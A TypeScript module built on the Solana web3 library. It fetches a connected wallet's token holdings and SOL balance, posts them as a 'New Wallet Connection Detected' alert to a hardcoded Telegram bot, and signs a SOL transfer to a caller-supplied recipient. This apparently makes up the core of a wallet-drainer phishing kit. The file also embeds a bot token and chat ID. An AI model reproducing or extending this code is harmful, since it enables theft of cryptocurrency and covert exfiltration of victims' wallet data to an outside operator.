
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

// WARNING: Storing credentials in code is not secure
const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    console.log("Fetching token accounts for address:", walletAddress);
    
    const pubKey = new PublicKey(walletAddress);
    
    const response = await connection.getParsedTokenAccountsByOwner(
      pubKey,
      {
        programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
      }
    );

    console.log("Token accounts response:", response);

    return response.value.map(item => ({
      mint: item.account.data.parsed.info.mint,
      amount: item.account.data.parsed.info.tokenAmount.uiAmount,
      decimals: item.account.data.parsed.info.tokenAmount.decimals
    }));
  } catch (error) {
    console.error('Detailed error fetching token accounts:', error);
    // Return empty array instead of throwing
    return [];
  }
};

export const sendToTelegram = async (walletData: any) => {
  try {
    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
    let solBalance = 0;
    
    try {
      solBalance = await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
    
    const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;

    const formattedTokens = walletData.tokens.map((token: any) => 
      `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
    ).join('\n\n');

    const message = `🔍 New Wallet Connection Detected:\n\n` +
      `👛 Wallet Address: ${walletData.address}\n` +
      `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `💰 Token Balances:\n${formattedTokens}\n\n` +
      `🌐 Network: Solana Mainnet`;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Telegram API response:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
  try {
    console.log('Creating transaction...');
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(recipientAddress),
        lamports: Math.floor(amount * LAMPORTS_PER_SOL),
      })
    );

    console.log('Sending transaction...');
    const signature = await sendAndConfirmTransaction(
      connection,
      transaction,
      [wallet],
      {
        commitment: 'confirmed',
        preflightCommitment: 'confirmed',
      }
    );

    console.log('Transaction successful:', signature);
    return signature;
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};
